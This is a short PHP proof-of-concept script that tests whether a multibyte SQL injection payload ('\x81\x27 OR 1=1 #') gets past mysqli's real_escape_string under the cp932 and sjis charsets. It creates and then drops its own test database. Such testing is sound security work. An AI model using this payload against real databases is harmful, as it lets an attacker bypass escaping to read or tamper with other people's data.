<?php
$username = 'username';
$password = 'password';

$mysqli = new mysqli('localhost', $username, $password);
foreach (array('cp932', 'sjis') as $charset)
{
        $mysqli->query("SET NAMES {$charset}");
        $mysqli->query("CREATE DATABASE {$charset}_db CHARACTER SET {$charset}");
        $mysqli->query("USE {$charset}_db");
        $mysqli->query("CREATE TABLE foo (bar VARCHAR(16) NOT NULL)");
        $mysqli->query("INSERT INTO foo (bar) VALUES ('baz'), ('qux')");

        $input = "\x81\x27 OR 1=1 #";
        $input = $mysqli->real_escape_string($input);
        $query = "SELECT * FROM foo WHERE bar = '{$input}' LIMIT 1";
        $result = $mysqli->query($query);
        if ($result->num_rows > 1)
        {
                echo "{$charset} exploit successful!\n";
        }

        $mysqli->query("DROP DATABASE {$charset}_db");
}